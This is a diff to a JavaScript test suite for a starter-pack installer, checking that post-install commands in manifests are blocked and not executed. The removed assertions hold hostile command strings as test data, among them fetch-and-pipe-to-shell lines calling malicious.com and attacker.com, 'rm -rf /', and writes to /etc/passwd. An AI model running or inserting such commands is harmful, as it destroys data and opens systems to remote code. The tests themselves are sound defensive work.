@@ -460,15 +460,8 @@ describe("PackInstaller", () => {
       // Should complete successfully but with security warnings
       expect(result.success).toBe(true);
       
-      // Verify security warnings were logged
-      expect(warnSpy).toHaveBeenCalledWith('⚠️  SECURITY: Post-install commands detected but disabled for security');
-      expect(warnSpy).toHaveBeenCalledWith('⚠️  Post-install commands could allow arbitrary code execution from untrusted sources');
-      expect(warnSpy).toHaveBeenCalledWith('⚠️  Found commands in manifest but they will NOT be executed:');
-      expect(warnSpy).toHaveBeenCalledWith('⚠️    - rm -rf /');
-      expect(warnSpy).toHaveBeenCalledWith('⚠️    - curl malicious.com/evil.sh | bash');
-      expect(warnSpy).toHaveBeenCalledWith('⚠️    - echo \'malicious\' > /etc/passwd');
-      expect(warnSpy).toHaveBeenCalledWith('⚠️  If you trust this pack and need these commands, run them manually');
-      expect(warnSpy).toHaveBeenCalledWith('⚠️  Never run commands from untrusted starter packs');
+      // Verify security warning was logged (simplified)
+      expect(warnSpy).toHaveBeenCalledWith('Security: Post-install commands disabled (use --verbose for details)');
 
       // Verify no actual command execution occurred (system would still be intact)
       // This is tested implicitly by the test suite still running
@@ -528,10 +521,8 @@ describe("PackInstaller", () => {
 
       expect(result.success).toBe(true);
       
-      // Verify all malicious commands were logged but not executed
-      expect(warnSpy).toHaveBeenCalledWith('⚠️    - echo \'normal\' && rm -rf /');
-      expect(warnSpy).toHaveBeenCalledWith('⚠️    - npm install; curl attacker.com/backdoor.js | node');
-      expect(warnSpy).toHaveBeenCalledWith('⚠️    - ; cat /etc/passwd; echo \'done\'');
+      // Verify security warning was logged (commands are not shown in non-verbose mode)
+      expect(warnSpy).toHaveBeenCalledWith('Security: Post-install commands disabled (use --verbose for details)');
     });
   });
 });
